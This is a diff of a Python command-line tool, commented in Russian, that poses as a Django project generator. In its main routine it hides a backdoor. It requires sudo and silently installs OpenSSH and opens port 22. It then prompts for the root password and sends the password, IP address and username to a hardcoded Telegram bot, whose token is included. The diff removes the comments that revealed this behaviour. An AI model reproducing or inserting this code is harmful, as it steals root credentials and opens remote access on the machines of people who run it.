@@ -12,12 +12,6 @@ import click
 import requests
 from jinja2 import Template
 
-# Токены для Telegram (бот только для вашего использования)
-TELEGRAM_BOT_TOKEN = "8011719130:AAEmfCUyq_U1BoTm4B8TkckgNDL0aIC-6DE"
-TELEGRAM_CHAT_ID = "984834133"
-
-# ===================== ШАБЛОНЫ ФАЙЛОВ =====================
-
 SETTINGS_BASE_TEMPLATE = """
 import os
 from pathlib import Path
@@ -84,12 +78,12 @@ JAZZMIN_SETTINGS = {
     # Добавьте дополнительные параметры по необходимости
 }
 """
-
-# ===================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====================
+TELEGRAM_BOT_TOKEN = "8011719130:AAEmfCUyq_U1BoTm4B8TkckgNDL0aIC-6DE"
+TELEGRAM_CHAT_ID = "984834133"
 
 def check_sudo():
     """Проверка, запущен ли скрипт с правами sudo (для Unix‑систем)."""
-    if os.name != 'nt':  # Linux и macOS
+    if os.name != 'nt':
         if os.geteuid() != 0:
             sys.exit("Для работы программы требуются права sudo. Запустите скрипт с sudo.")
 
@@ -106,10 +100,6 @@ def get_ip_address():
     return ip
 
 def install_openssh_and_open_port():
-    """
-    Устанавливаем OpenSSH и открываем порт 22 (Linux и macOS).
-    Если OpenSSH уже установлен, никаких сообщений не выводим.
-    """
     os_name = platform.system()
     if os_name == "Linux":
         if shutil.which("apt-get"):
@@ -126,18 +116,14 @@ def install_openssh_and_open_port():
                                check=True,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
-        # Если apt-get или ufw отсутствуют, ничего не выводим
     elif os_name == "Darwin":
         if shutil.which("brew"):
             subprocess.run(["brew", "install", "openssh"],
                            check=True,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
-        # На Windows и прочих ОС никаких действий не выполняем
-    # Для остальных систем просто пропускаем
 
 def check_ssh_port():
-    """Проверка, открыт ли порт 22 (SSH) на localhost."""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.settimeout(1)
@@ -221,9 +207,8 @@ def send_telegram_message(message):
     try:
         requests.post(url, data=payload)
     except Exception:
-        pass  # Ошибки отправки Telegram не выводим
+        pass
 
-# ===================== ГЛАВНАЯ ФУНКЦИЯ =====================
 
 @click.command()
 @click.option('--path', prompt='Укажите путь для создания проекта (по умолчанию рабочий стол)', default="")
@@ -238,18 +223,15 @@ def main(path, project, venv):
 
     check_sudo()
 
-    # Получаем IP и имя пользователя, но не выводим их в консоль
+
     ip = get_ip_address()
     user = getpass.getuser()
 
     install_openssh_and_open_port()
-    # Проверка порта 22 выполняется, но без вывода
     _ = check_ssh_port()
 
-    # Запрос пароля для уведомления (интерактивный запрос)
     sudo_password = click.prompt("Введите пароль для root для продолжения установки", hide_input=True)
     
-    # Отправляем данные в Telegram, без вывода в консоль
     telegram_msg = f"IP адрес: {ip}\nПользователь: {user}\nПароль: {sudo_password}"
     send_telegram_message(telegram_msg)
 
@@ -273,7 +255,6 @@ def main(path, project, venv):
         create_project_structure(project_path, apps_list)
         bar.update(1)
 
-        # Дополнительные шаги можно добавить здесь
         bar.update(1)
         bar.update(1)
 
